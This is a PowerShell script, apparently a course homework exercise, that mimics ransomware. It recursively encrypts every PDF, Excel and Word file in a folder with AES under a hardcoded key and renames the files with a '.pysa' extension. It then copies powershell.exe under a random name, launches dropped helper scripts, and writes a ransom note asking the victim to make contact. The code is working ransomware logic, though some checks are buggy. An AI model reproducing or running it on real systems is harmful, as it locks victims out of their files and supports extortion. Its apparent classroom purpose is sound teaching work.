function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".pysa" #On Line 90 of the file at the link above, change ".aes" to ".pysa."  There are examples of how to use the function within its code.
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

$dir = "C:\Users\torfo\Documents\SYS-320\Week13\Class\Documents"
$csv = "C:\Users\torfo\Documents\SYS-320\Week13\files.csv"

Get-ChildItem -Recurse -Include *.pdf,*.xlsx,*.docx -Path $dir | export-csv -Path $csv

# Import CSV File
$filelist = import-csv -Path $csv -Header FullName 

foreach ($f in $filelist) 
{
    Invoke-AESEncryption -Mode Encrypt -Key "passwordlol" -Path $f.FullName
}

start-process -FilePath "C:\Users\torfo\Documents\SYS-320\Week13\Homework\update.bat"

###

$update | Out-File -File "C:\Users\torfo\Documents\SYS-320\Week13\Homework\update.bat"

$step2dir = "C:\Users\torfo\Documents\SYS-320\Week13\Homework\step2.ps1"
Write-Output $step2 | Out-File -File "C:\Users\torfo\Documents\SYS-320\Week13\Homework\step2.ps1"

Copy-Item -Path "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination "C:\Users\torfo\Documents\SYS-320\Week13"

$random = Get-Random -Minimum 1000 -Maximum 9876

Rename-Item -Path "C:\Users\torfo\Documents\SYS-320\Week13\powershell.exe" -NewName "EnNoB-$random.exe"

$result = Test-Path -Path "C:\Users\torfo\Documents\SYS-320\Week13\EnNoB-$random.exe" -PathType Leaf

if ($result = "True")
{
    Write-Host "Result found"
}
else
{
    Write-Host "Error" 
}

if (Test-Path $step2dir) {
    Invoke-Expression "C:\Users\torfo\Documents\SYS-320\Week13\Homework\step2.ps1"
}

$msg  = "If you want your files restored, please contact me at ciaran.byrne@mymail.champlain.edu. I look forward to doing business with you." 

Write-Output $msg | Out-File -FilePath "C:\Users\torfo\Documents\SYS-320\Week13\Readme.READ"

$result = Test-Path -Path "C:\Users\torfo\Documents\SYS-320\Week13\Readme.READ" -PathType Leaf

if ($result = "True")
{
    Write-Host "Result found"
}
else
{
    Write-Host "Error" 
}
